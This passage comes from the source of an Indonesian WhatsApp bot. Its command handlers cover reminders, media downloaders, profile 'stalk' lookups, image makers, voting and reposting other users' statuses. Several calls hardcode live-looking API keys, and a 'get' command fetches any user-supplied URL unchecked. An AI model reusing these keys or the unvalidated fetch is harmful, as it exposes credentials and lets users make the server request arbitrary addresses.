              syaa.sendMessage(from, media, image, {
                contextInfo: { mentionedJid: [sender] },
                caption: teks,
              });
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                "./database/reminder.json",
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        } else if (isQuotedAudio) {
          encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
            .message.extendedTextMessage.contextInfo;
          media = await syaa.downloadAndSaveMediaMessage(encmedia);
          await syaa.sendMessage(
            from,
            `── 「 REMINDER 」 ──
    
Reminder berhasil diaktifkan!
➸ Pesan: ${messRemind}
➸ Type: Audio
➸ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${
              parsedTime.seconds
            } detik
➸ Untuk: @${sender.split("@")[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          const intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              anu = await reminder.getReminderMsg(sender, _reminder);
              syaa.sendMessage(
                from,
                `── 「 REMINDER 」 ──

⏰ @${sender.split("@")[0]} ⏰
➸ Pesan: ${messRemind}
➸ Type: ${reminder.getReminderType(sender, _reminder)}`,
                text,
                { contextInfo: { mentionedJid: [sender] } }
              );
              syaa.sendMessage(from, fs.readFileSync(media), audio, {
                contextInfo: { mentionedJid: [sender] },
                mimetype: "audio/mp4",
                ptt: true,
                caption: teks,
              });
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                "./database/reminder.json",
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        }
        break;
      case "jadibot":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (!isOwner && !mek.key.fromMe) return sticOwner(from)
        if (mek.key.fromMe) return reply("Tidak bisa jadibot di dalam bot");
        jadibot(reply, syaa, from);
        break;
      case "stopjadibot":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (mek.key.fromMe)
          return reply("tidak bisa stopjadibot kecuali owner");
        stopjadibot(reply);
        break;
      case "listbot":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        let tekss = "「 *LIST JADIBOT* 」\n";
        for (let i of listjadibot) {
          tekss += `*Nomor* : ${i.jid.split("@")[0]}
*Nama* : ${i.name}
*Device* : ${i.phone.device_manufacturer}
*Model* : ${i.phone.device_model}\n\n`;
        }
        reply(tekss);
        break;

      //------------------< Fitur yg pake button >-------------------
      case "setprefix":
        if (!isOwner && !mek.key.fromMe) return sticOwner(from)
        sendButMessage(
          from,
          `PREFIX : ${prefixStatus ? "Multi Prefix" : "No Prefix"}`,
          `Silahkan pilih salah satu`,
          [
            {
              buttonId: `${prefix}noprefix`,
              buttonText: {
                displayText: `NOPREFIX`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}multiprefix`,
              buttonText: {
                displayText: `MULTIPREFIX`,
              },
              type: 1,
            },
          ]
        );
        break;
      case "mode":
        if (!isOwner && !mek.key.fromMe) return sticOwner(from)
        sendButMessage(from, `MODE SELF/PUBLIC`, `Silahkan pilih salah satu`, [
          {
            buttonId: `${prefix}self`,
            buttonText: {
              displayText: `SELF MODE`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}public`,
            buttonText: {
              displayText: `PUBLIC MODE`,
            },
            type: 1,
          },
        ]);
        break;
      case "grup":
        
        sendButMessage(from, `GROUP SETTING`, `Silahkan pilih salah satu`, [
          {
            buttonId: `${prefix}buka`,
            buttonText: {
              displayText: `OPEN`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}tutup`,
            buttonText: {
              displayText: `CLOSE`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}revoke`,
            buttonText: {
              displayText: `REVOKE INVITE`,
            },
            type: 1,
          },
        ]);
        break;
////TEST ADD RESPON BY ARASYA
case 'addrespon':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
			if (!isOwner && !mek.key.fromMe) return sticOwner(from)
				if (args.length < 1) return reply(`Penggunaan ${prefix}addrespon hai|hai juga`)
				argz = arg.split('|')
				if (checkCommands(argz[0], commandsDB) === true) return reply(`Udah ada`)
				addCommands(argz[0], argz[1], sender, commandsDB)
				reply(`Sukses menambahkan respon ${argz[0]}`)
				break
			case 'delrespon':
			  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
			if (!isOwner && !mek.key.fromMe) return sticOwner(from)
				if (args.length < 1) return reply(`Penggunaan ${prefix}delrespon hai`)
				if (!checkCommands(body.slice(11), commandsDB)) return reply(`Ga ada di database`)
                deleteCommands(body.slice(11), commandsDB)
				reply(`Sukses menghapus respon ${body.slice(11)}`)
				break
				case 'listrespon':
				  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
teks = `\`\`\`「 LIST RESPON  」\`\`\`\n\n`
for (let i = 0; i < commandsDB.length; i ++){
teks += `❏ *Tanya:* ${commandsDB[i].pesan}\n`
teks += `❏ *Balasan:* ${commandsDB[i].balasan}\n`
teks += `❏ *Creator:* ${commandsDB[i].creator}\n\n`
}
reply(teks)
break
//////TEST YUTUP TERNYATA WORK
case 'ytmp3':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
  reply("Sedang Mendownload audio")
    
              if (args.length < 1) return reply('Link Nya Mana?')
              if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply(mess.error.Iv)
              teks = args.join(' ')
              res = await y2mateA(teks)
              sendFileFromUrl(res[0].link, document, {quoted: mek, mimetype: 'audio/mp3', filename: res[0].output})
              break
case 'ytmp4':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
  reply("Sedang Mendownload Video")
              if (args.length < 1) return reply('Link Nya Mana?')
              if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply(mess.error.Iv)
              teks = args.join(' ')
              res = await y2mateV(teks)
              sendFileFromUrl(res[0].link, video, {quoted: mek, mimetype: 'video/mp4', filename: res[0].output})
              break
case 'buttons1':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
    
              if (args.length < 1) return reply('Link Nya Mana?')
              if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply(mess.error.Iv)
              teks = args.join(' ')
              res = await y2mateA(teks)
              sendFileFromUrl(res[0].link, document, {quoted: mek, mimetype: 'audio/mp3', filename: res[0].output})
              break
     case 'buttons2':
       if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
              if (args.length < 1) return reply('Link Nya Mana?')
              if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply(mess.error.Iv)
              teks = args.join(' ')
              res = await y2mateV(teks)
              sendFileFromUrl(res[0].link, video, {quoted: mek, mimetype: 'video/mp4', filename: res[0].output})
              break
case 'youtube':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
  
             if (args.length < 1) return reply('Link Nya Mana?')
             if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply(mess.error.Iv)
             teks = args.join(' ')
             res = await y2mateA(teks).catch(e => {
             reply('_[ ! ] Error Gagal Dalam Memasuki Web Y2mate_')
})
             result = `*Youtube Downloader*
             
📜 Title : ${res[0].judul}
🎁 Type : mp3/mp4
⚖️ Durasi : ${res[0].size}`
              buttons = [{buttonId: `${prefix}buttons2 ${q}`,buttonText:{displayText: `▶️ Video`},type:1},{buttonId:`${prefix}buttons1 ${q}`,buttonText:{displayText:'🎵 Audio'},type:1}]
              fs.writeFileSync(`./ytmp.jpeg`, await getBuffer(res[0].thumb))
              imageMsg = ( await syaa.prepareMessage(from, fs.readFileSync(`./ytmp.jpeg`), 'imageMessage', {thumbnail: Buffer.alloc(0)})).message.imageMessage
              buttonsMessage = {footerText:'Pilih satu format di bawah ini', imageMessage: imageMsg,
              contentText:`${result}`,buttons,headerType:4}
              prep = await syaa.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
              syaa.relayWAMessage(prep)
              fs.unlinkSync(`./ytmp.jpeg`)
              break
      //JCCHCCGHTHDTRSRS
      case "twitter":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (!isUrl(args[0]) && !args[0].includes("twitter.com"))
          return reply(mess.Iv);
        if (!q) return fakegroup("Linknya?");
        ten = args[0];
        var res = await hx.twitter(`${ten}`);
        ren = `${g.HD}`;
        sendMediaURL(from, ren, "DONE");
        break;
      case "facebook":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (!q) return reply("Linknya?");
        if (!isUrl(args[0]) && !args[0].includes("facebook.com"))
          return reply(mess.Iv);
        reply(mess.wait);
        te = args.join(" ");
        hx.fbdown(`${te}`).then((G) => {
          ten = `${G.HD}`;
          sendMediaURL(from, ten, `*Link video_normal* : ${G.Normal_video}`);
        });
        break;
      case "instagram":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (isBanned)return
        if (!isUrl(args[0]) && !args[0].includes("instagram.com"))
          return reply(mess.Iv);
        if (!q) return fakegroup("Linknya?");
        reply(mess.wait);
        hx.igdl(args[0]).then(async (result) => {
          for (let i of result.medias) {
            if (i.url.includes("mp4")) {
              let link = await getBuffer(i.url);
              syaa.sendMessage(from, link, video, {
                quoted: mek,
                caption: `Type : ${i.type}`,
              });
            } else {
              let link = await getBuffer(i.url);
              syaa.sendMessage(from, link, image, {
                quoted: mek,
                caption: `Type : ${i.type}`,
              });
            }
          }
        });
        break;
        case 'tiktok': {
                if (!isUrl(args[1]) && !args[1].includes('tiktok.com')) return reply(mess.error.Iv)
                try {
                reply(mess.wait)
                var data = await fetchJson(`https://hardianto-chan.herokuapp.com/api/download/tiktok?url=${args[1]}&apikey=hardianto`)
                    let { title, thumbnail, description, duration, link } = data.result
                    let capt = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ TIKTOK NOWM DOWNLOADER
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

Data Berhasil Didapatkan!
\`\`\`▢ Title : ${title}\`\`\`
\`\`\`▢ Ext : MP4\`\`\`
\`\`\`▢ Username / Nickname : ${data.result.author.username} / ${data.result.author.nickname}\`\`\`
\`\`\`▢ Duration : ${duration}\`\`\`
\`\`\`▢ LikeCount : ${data.result.statistic.diggCount}\`\`\`
\`\`\`▢ ShareCount : ${data.result.statistic.shareCount}\`\`\`
\`\`\`▢ CommentCount : ${data.result.statistic.commentCount}\`\`\`
\`\`\`▢ PlayCount : ${data.result.statistic.playCount}\`\`\`
\`\`\`▢ Descripttion : ${description}\`\`\`
`
                    var buff = await getBuffer(link)
                    syaa.sendMessage(from, buff, video, {quoted: mek, caption: capt})
                    } catch (e) {
                        sendMess('TiktokWM Error : ' + err)
                        console.log(color('[TiktokWM]', 'red'), err)
                        reply(mess.error.api)
                    }
            }
                break

      case "noprefix":
        if (!isOwner && !mek.key.fromMe) return sticOwner(from)
        if (prefixStatus == false) return reply("No prefix is recently on!");
        prefixStatus = false;
        reply("Berhasil mengganti prefix menjadi noprefix");
        break;
      case "multiprefix":
        if (!isOwner && !mek.key.fromMe) return sticOwner(from)
        if (prefixStatus == true) return reply("Multi prefix is recently on!");
        prefixStatus = true;
        reply("Berhasil mengganti prefix menjadi multiprefix");
        break;

      case "delvote":
      if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (!mek.key.remoteJid) return;
        if (isVote) return reply("Tidak ada sesi Voting");
        delVote(from);
        reply("Sukses Menghapus sesi Voting Di Grup Ini");
        break;
      case "voting":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (!isGroupAdmins && !mek.key.fromMe) return;
        if (!isGroup) return reply(mess.only.group);
        if (isVote) return reply("Sesi Voting Sedang Berlangsung Di Grup Ini");
        if (!q)
          return reply(
            "*Voting*\n\n" +
              prefix +
              "voting @tag target | reason  | 1 (1 = 1 Menit)"
          );
        if (
          mek.message.extendedTextMessage.contextInfo.mentionedJid.length > 0 ||
          mek.message.extendedTextMessage.contextInfo == null
        ) {
          let id = mek.message.extendedTextMessage.contextInfo.mentionedJid[0];
          split = args.join(" ").replace("@", "").split("|");
          if (!Number(split[2]))
            return reply(
              "masukan angka di baris ke 3\nContoh: 1-9999\n1 = 1 Menit"
            );
          await mentions(
            "Vote " +
              "@" +
              id.split("@")[0] +
              " Di Mulai" +
              "\n\n" +
              `vote = ✅\ndevote = ❌\n\nAlasan: ${split[1]}`,
            [id],
            true
          );
          addVote(from, split[1], split[0], split[2], reply);
        }
        break;
      case "linkwa":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (!q) return reply("cari group apa?");
        hx.linkwa(q).then((result) => {
          let res = "*「 _LINK WA_ 」*\n\n";
          for (let i of result) {
            res += `*Nama*: *${i.nama}\n*Link*: ${i.link}\n\n`;
          }
          reply(res);
        });
        break;
      
      case "githubstalk":
        if (!q) return reply("Usernamenya?");
        const oi = await fetchJson(
          `https://api.dhnjing.xyz/stalk/github?user=dehan-j1ng`
        );
        const mm = `*GITHUB STALK*
    Username: ${oi.result.username}
    Fullname: ${oi.result.name}
    Bio: ${oi.result.user_bio}

    Jumlah repo: ${oi.result.user_repo}
    Following: ${oi.result.user_following}
    Follower: ${oi.result.user_followers}`;
        reply(mm);
        break;
      case "tiktokstalk":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (!q) return reply("Usernamenya? ");
        var i = await fetchJson(
          `https://api.dhnjing.xyz/stalk/tiktok?user=@${q}`
        );
        buff = await getBuffer(i.result.user.avatarLarger);
        var ii = `*TIKTOK STALK*
    Username: ${q}
    Nickname: ${i.result.user.nickname}
    Bio: ${i.result.user.signature}

    Jumlah postingan: ${i.result.stats.videoCount}
    Following: ${i.result.stats.followingCount}
    Follower: ${i.result.stats.followerCount}`;
        syaa.sendMessage(from, buff, image, { quoted: mek, caption: ii });
        break;
      case "igstory":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (!q) return reply("Usernamenya?");
        hx.igstory(q).then(async (result) => {
          for (let i of result.medias) {
            if (i.url.includes("mp4")) {
              let link = await getBuffer(i.url);
              syaa.sendMessage(from, link, video, {
                quoted: mek,
                caption: `Type : ${i.type}`,
              });
            } else {
              let link = await getBuffer(i.url);
              syaa.sendMessage(from, link, image, {
                quoted: mek,
                caption: `Type : ${i.type}`,
              });
            }
          }
        });
        break;
      case "colongsw": //arif
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (!mek.key.fromMe) return;
        if ((isMedia && !mek.message.videoMessage) || isQuotedImage) {
          ger = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          owgi = await syaa.downloadAndSaveMediaMessage(ger);
          syaa.sendMessage(from, fs.readFileSync(owgi), "imageMessage", {
            caption: q,
          });
          reply("Sukses");
          fs.unlinkSync(owgi);
        } else if ((isMedia && !mek.message.videoMessage) || isQuotedVideo) {
          ger = isQuotedVideo
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          owgi = await syaa.downloadAndSaveMediaMessage(ger);
          syaa.sendMessage(from, fs.readFileSync(owgi), "videoMessage", {
            caption: q,
          });
          reply("Sukses");
          fs.unlinkSync(owgi);
        } else {
          reply("Reply sw foto / video yg mau dicolong");
        }
        break;
        
      case "nulis":
        case "tulis":
        reply(`PILIH TIPE BUKU BERIKUT
- ${prefix}nuliskiri _Text_
- ${prefix}nuliskanan _Text_
- ${prefix}foliokiri _Text_
- ${prefix}foliokanan _Text_`)
break
        case "nuliskiri":
          if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (args.length < 1)
          return reply(
            `Usage ${prefix + command} Arasya`
          );
        var bodi = args.join(" ");
        reply("Sedang Menulis....");
        rakz = await getBuffer(
          `https://hardianto-chan.herokuapp.com/api/nuliskiri?text=${bodi}&apikey=hardianto`
        );
        syaa.sendMessage(from, rakz, image, {
          quoted: mek,
          thumbnail: Buffer.alloc(0),
        });
        break;
        case "nuliskanan":
          if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (args.length < 1)
          return reply(
            `Usage ${prefix + command} Arasya`
          );
        var bodi = args.join(" ");
        reply("Sedang Menulis....");
        rakz = await getBuffer(
          `https://hardianto-chan.herokuapp.com/api/nuliskanan?text=${bodi}&apikey=hardianto`
        );
        syaa.sendMessage(from, rakz, image, {
          quoted: mek,
          thumbnail: Buffer.alloc(0),
        });
        break;
        case "foliokiri":
          if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (args.length < 1)
          return reply(
            `Usage ${prefix + command} Arasya`
          );
        var bodi = args.join(" ");
        reply("Sedang Menulis....");
        rakz = await getBuffer(
          `https://hardianto-chan.herokuapp.com/api/foliokiri?text=${bodi}&apikey=hardianto`
        );
        syaa.sendMessage(from, rakz, image, {
          quoted: mek,
          thumbnail: Buffer.alloc(0),
        });
        break;
        case "foliokanan":
          if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (args.length < 1)
          return reply(
            `Usage ${prefix + command} Arasya`
          );
        var bodi = args.join(" ");
        reply("Sedang Menulis....");
        rakz = await getBuffer(
          `https://hardianto-chan.herokuapp.com/api/foliokanan?text=${bodi}&apikey=hardianto`
        );
        syaa.sendMessage(from, rakz, image, {
          quoted: mek,
          thumbnail: Buffer.alloc(0),
        });
        break;

      case "card-game":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if ((isMedia && !mek.message.videoMessage) || isQuotedImage) {
          ted = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          //  console.log(ted)
          var bodi = args.join(" ");
          var nama = bodi.split("|")[0];
          var kelas = bodi.split("|")[1];
          reply("Loading.....");
          owgi = await syaa.downloadAndSaveMediaMessage(ted);
          console.log(owgi);
          anu = await imgbb("dc773cce66f3dcf3ab3bc83dc7bf3555", owgi);
          console.log(anu);
          //reply (anu)

          hehe = await getBuffer(
            `https://fdz-app.herokuapp.com/api/maker/card-game?nama=${nama}&desc=${kelas}&picurl=${anu.display_url}`
          );
          syaa.sendMessage(from, hehe, image, {
            quoted: mek,
            thumbnail: Buffer.alloc(0),
          });
        } else {
          reply(
            `Kirim gambar atau tag gambar yang sudah dikirim lalu  dengan caption ${prefix}card-game nama|teks keterangan `
          );
        }
        break;

      case "sertiff1":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        pll = body.slice(10);
        if (args.length < 1) return reply(prefix);
        reply("Loading.....");
        rakz = await getBuffer(
          `https://fdz-app.herokuapp.com/api/maker/sertif-ff-v1?text=${pll}`
        );
        syaa.sendMessage(from, rakz, image, {
          quoted: mek,
          thumbnail: Buffer.alloc(0),
        });
        break;
      case "bpink":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        pll = body.slice(7);

        if (args.length < 1) return reply(preffk);
        reply("Loading.....");
        rakz = await getBuffer(
          `https://fdz-app.herokuapp.com/api/maker/blackpink?text=${pll}`
        );
        syaa.sendMessage(from, rakz, image, {
          quoted: mek,
          thumbnail: Buffer.alloc(0),
        });
        break;
      case "wanted":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedImage) &&
          args.length == 0
        ) {
          ted = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          reply("Loading.....");
          owgi = await syaa.downloadAndSaveMediaMessage(ted);
          //	  console.log(owgi)
          anu = await imgbb("3395a377ebac7e9f744c3683b44a2a59", owgi);
          console.log(anu);
          hehe = await getBuffer(
            `https://fdz-app.herokuapp.com/api/maker/wanted?picurl=${anu.display_url}`
          );
          syaa.sendMessage(from, hehe, image, {
            quoted: mek,
            thumbnail: Buffer.alloc(0),
          });
        }
        break;

      case "deltrash":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedImage) &&
          args.length == 0
        ) {
          ted = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          reply("Loading.....");
          owgi = await syaa.downloadAndSaveMediaMessage(ted);
          //	  console.log(owgi)
          anu = await imgbb("3395a377ebac7e9f744c3683b44a2a59", owgi);
          console.log(anu);
          hehe = await getBuffer(
            `https://fdz-app.herokuapp.com/api/maker/deltrash?imgurl=${anu.display_url}`
          );
          syaa.sendMessage(from, hehe, image, {
            quoted: mek,
            thumbnail: Buffer.alloc(0),
          });
        }
        break;

      case "squidrip":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedImage) &&
          args.length == 0
        ) {
          ted = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          reply("Loading.....");
          owgi = await syaa.downloadAndSaveMediaMessage(ted);
          console.log(owgi);
          anu = await imgbb("dc773cce66f3dcf3ab3bc83dc7bf3555", owgi);
          console.log(anu);
          hehe = await getBuffer(
            `https://fdz-app.herokuapp.com/api/maker/rip?picurl=${anu.display_url}`
          );
          syaa.sendMessage(from, hehe, image, {
            quoted: mek,
            thumbnail: Buffer.alloc(0),
          });
        }
        break;

      case "wasted":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedImage) &&
          args.length == 0
        ) {
          ted = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          //  console.log(ted)
          reply("Loading.....");
          owgi = await syaa.downloadAndSaveMediaMessage(ted);
          console.log(owgi);
          anu = await imgbb("dc773cce66f3dcf3ab3bc83dc7bf3555", owgi);
          console.log(anu);
          hehe = await getBuffer(
            `https://fdz-app.herokuapp.com/api/maker/wasted?imgurl=${anu.display_url}`
          );
          syaa.sendMessage(from, hehe, image, {
            quoted: mek,
            thumbnail: Buffer.alloc(0),
          });
        } /*else {
                                                                 reply('Jangan tambah kan apapun pada command')
                                                                   }*/
        break;
      //RANDOM IMAGE
     /* case "waifu":
      case "loli":
      case "husbu":
      case "milf":
      case "cosplay":
      case "naruto":
      case "wibu":
      case "aeshtetic":
      case "wallpaperanime":
        let wipu = await fetchJson(
          `https://api.dhnjing.xyz/search/pinterest/image?query=${command}`
        );
        gmbr = wipu.result[Math.floor(Math.random() * wipu.result.lenght)];
        fs.writeFileSync(`./${sender}.jpeg`, await getBuffer(gmbr.orig.url));
        buttons = [
          {
            buttonId: `${prefix + command}`,
            buttonText: { displayText: `➡️Next` },
            type: 1,
          },
        ];
        imageMsg = (
          await syaa.prepareMessage(
            from,
            fs.readFileSync(`./${sender}.jpeg`),
            "imageMessage",
            { thumbnail: Buffer.alloc(0) }
          )
        ).message.imageMessage;
        buttonsMessage = {
          footerText: "Jangan Lupa Donasi Ya Kak ☕",
          imageMessage: imageMsg,
          contentText: `klik Next untuk ke gambar selanjut nya`,
          buttons,
          headerType: 4,
        };
        prep = await syaa.prepareMessageFromContent(
          from,
          { buttonsMessage },
          { quoted: mek }
        );
        syaa.relayWAMessage(prep);
        fs.unlinkSync(`./${sender}.jpeg`);
        break;*/
      case "loli":
      case "quotes":
      case "kucing":
      case "anjing":
      case "minato":
      case "kakashi":
      case "boruto":
      case "sarada":
      case "mitsuki":
      case "sasuke":
      case "sakura":
      case "squidward":
      case "spongebob":
      case "sudiro":
      case "itachi":
      case "cecan":
      case "cogan":
      case "memeindo":
      case "polosanmeme":
      case "megumin":
      case "waifu":
      case "patrick":
      case "husbu":
      case "milf":
      case "aesthetic":
      case "cosplay":
      case "naruto":
      case "wibu":
      case "aeshtetic":
      case "wallpaperanime":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        sendButMessage(from, `Random Image by @sofunsyabi.id`, `press the button below`, [
          {
            buttonId: `/pinterest ${command}`,
            buttonText: {
              displayText: `${command}`,
            },
            type: 1,
          },
        ]);
        break
      case "caripesan":
        case "smsg":
          if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (!q) return reply("pesannya apa bang?");
        let v = await syaa.searchMessages(q, from, 10, 1);
        let s = v.messages;
        let el = s.filter((v) => v.message);
        el.shift();
        try {
          if (el[0].message.conversation == undefined) return;
          reply(`Ditemukan ${el.length} pesan`);
          await sleep(3000);
          for (let i = 0; i < el.length; i++) {
            await syaa.sendMessage(from, "Nih pesannya", text, {
              quoted: el[i],
            });
          }
        } catch (e) {
          reply("Pesan tidak ditemukan!");
        }
        break;
        case "lirik":
          if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
          if (!q) return reply("lagu apa?");
reply(mess.wait)
teks = body.slice(7)
lirikLagu(teks).then((res) => {
let lirik = `*Judul Lagu :* ${teks}\n*Lirik Lagu :* ${res[0].result}`
reply(lirik)
})
break
      case "otaku":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (!q) return reply("judul animenya?");
        let anime = await hx.otakudesu(q);
        rem = `*Judul* : ${anime.judul}
*Jepang* : ${anime.jepang}
*Rating* : ${anime.rate}
*Produser* : ${anime.produser}
*Status* : ${anime.status}
*Episode* : ${anime.episode}
*Durasi* : ${anime.durasi}
*Rilis* : ${anime.rilis}
*Studio* : ${anime.studio}
*Genre* : ${anime.genre}\n
*Sinopsis* :
${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.batchSD}\n*Link Download HD* : ${anime.batchHD}`;
        ram = await getBuffer(anime.img);
        syaa.sendMessage(from, ram, image, { quoted: mek, caption: rem });
        break;
      case "komiku":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (!q) return reply(`judulnya?\n${prefix}komiku mao gakuin`);
        let komik = await hx.komiku(q);
        result = `*Title* : ${komik.title}\n
*Title Indo* : ${komik.indo}\n
*Update* : ${komik.update}\n
*Desc* : ${komik.desc}\n
*Chapter Awal* : ${komik.chapter_awal}
*Chapter Akhir* : ${komik.chapter_akhir}`;
        sendMediaURL(from, komik.image, result);
        break;
      case "chara":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (!q) return reply(`gambar apa?\n${prefix}chara syaa`);
        let im = await hx.chara(q);
        let acak = im[Math.floor(Math.random() * im.length)];
        let li = await getBuffer(acak);
        await syaa.sendMessage(from, li, image, { quoted: mek });
        break;
      case "pinterest":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (!q) return reply("gambar apa?");
        reply("Sedang mencari Imagenya🔍")
        let pin = await hx.pinterest(q);
        let ac = pin[Math.floor(Math.random() * pin.length)];
        let di = await getBuffer(ac);
        await syaa.sendMessage(from, di, image, { quoted: mek })
        break;
      case "playstore":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (!q) return reply("lu nyari apa?");
        let play = await hx.playstore(q);
        let store = "❉─────────────────────❉\n";
        for (let i of play) {
          store += `\n*「 _PLAY STORE_ 」*\n
- *Nama* : ${i.name}
- *Link* : ${i.link}\n
- *Dev* : ${i.developer}
- *Link Dev* : ${i.link_dev}\n❉─────────────────────❉`;
        }
        reply(store);
        break;
      case "on":
        if (!isOwner && !mek.key.fromMe) return sticOwner(from)
        offline = false;
        reply(" ```ANDA TELAH ONLINE``` ");
        break;
      case "status":
        reply(
          `*STATUS*\n${offline ? "> OFFLINE" : "> ONLINE"}\n${
            banChats ? "> SELF-MODE" : "> PUBLIC-MODE"
          }\n${prefixStatus ? "> MULTI-PREFIX" : "> NO-PREFIX"}`
        );
        break;
      case "off":
        if (!isOwner && !mek.key.fromMe) return sticOwner(from)
        offline = true;
        waktu = Date.now();
        anuu = q ? q : "-";
        alasan = anuu;
        reply(" ```ANDA TELAH OFFLINE``` ");
        break;
      case "get":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (!q) return reply("linknya?");
        fetch(`${args[0]}`)
          .then((res) => res.text())
          .then((bu) => {
            reply(bu);
          });
        break;
      case "kontag":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        pe = args.join("");
        entah = pe.split("|")[0];
        nah = pe.split("|")[1];
        if (isNaN(entah)) return reply("Invalid phone number");
        members_ids = [];
        for (let mem of groupMembers) {
          members_ids.push(mem.jid);
        }
        vcard =
          "BEGIN:VCARD\n" +
          "VERSION:3.0\n" +
          `FN:${nah}\n` +
          `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum(
            "+" + entah
          ).getNumber("internasional")}\n` +
          "END:VCARD".trim();
        syaa.sendMessage(
          from,
